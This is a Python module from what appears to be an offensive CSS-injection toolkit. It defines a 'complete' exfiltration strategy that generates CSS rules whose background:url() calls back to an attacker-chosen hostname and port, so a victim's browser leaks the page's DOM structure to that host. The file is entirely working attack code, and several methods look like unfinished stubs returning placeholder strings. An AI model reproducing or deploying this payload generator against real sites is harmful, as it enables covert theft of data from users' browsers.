from cssinj.strategies.base import BaseExfiltrationStrategy
from cssinj.utils.default import ELEMENTS


class CompleteStrategy(BaseExfiltrationStrategy):
    """
    Complete exfiltration strategy.
    Exfiltrates the complete DOM structure of the HTML.
    """

    name = "complete"

    def __init__(
        self,
        hostname: str,
        port: int,
        element: str = "*",
        attribut: str = "value",
        timeout: float = 3.0,
    ) -> None:
        super().__init__(hostname, port, timeout)
        self.element = element
        self.attribut = attribut

    def generate_start_payload(self, client) -> str:
        print(self._generate_payload(client))

    def generate_next_payload(self, client) -> str:
        return "next"

    def handle_valid(self, client, data: str) -> str:
        return "valid"

    def handle_end(self, client) -> None:
        return "end"

    def _generate_payload(self, client) -> str:
        elements = "".join(
            f"html > {element}:nth-child(1){{background:url('//{self.hostname}:{self.port}/e?n={client.counter}&cid={client.id}');}}"
            for element in ELEMENTS
        )
        return elements
